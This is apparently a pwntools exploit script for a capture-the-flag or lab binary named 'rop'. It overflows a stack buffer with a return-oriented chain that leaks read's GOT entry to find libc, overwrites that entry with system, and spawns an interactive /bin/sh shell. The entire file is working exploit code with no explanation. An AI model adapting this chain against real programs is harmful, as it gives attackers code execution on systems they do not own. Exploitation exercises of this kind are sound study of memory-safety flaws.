from pwn import *

binary = "rop"

context.log_level = 'error'
context.binary = binary
p = process(binary)
elf = ELF(binary)
libc = ELF("/usr/lib/libc.so.6") # from `ldd rop`

off = 0x38

pop_rdi = 0x0000000000401203
pop_rsi_r15 = 0x0000000000401201
pop_rdx = 0x000000000040113a

sh = 0x403004

# write(1, read@got, 8)
leak_chain = p64(pop_rdi) + p64(1) + p64(pop_rsi_r15) + p64(elf.got['read']) + p64(0) + p64(pop_rdx) + p64(8) + p64(elf.plt['write'])
# read(0, read@got, 8)
ow_got_chain = p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(elf.got['read']) + p64(0) + p64(pop_rdx) + p64(8) + p64(elf.plt['read'])
# read(buf) -> system("/bin/sh")
call_system_chain = p64(pop_rdi) + p64(sh) + p64(elf.plt['read'])

chain = b"A" * off + leak_chain + ow_got_chain + call_system_chain

p.send(chain + b" " * (0x200 - len(chain)))
read_addr = u64(p.recv(8))
libc.address = read_addr - libc.symbols['read']

print("read_addr = {}".format(hex(read_addr)))
print("system_addr = {}".format(hex(libc.symbols['system'])))

# gdb.attach(p)
p.send(p64(libc.symbols['system']))

p.interactive()
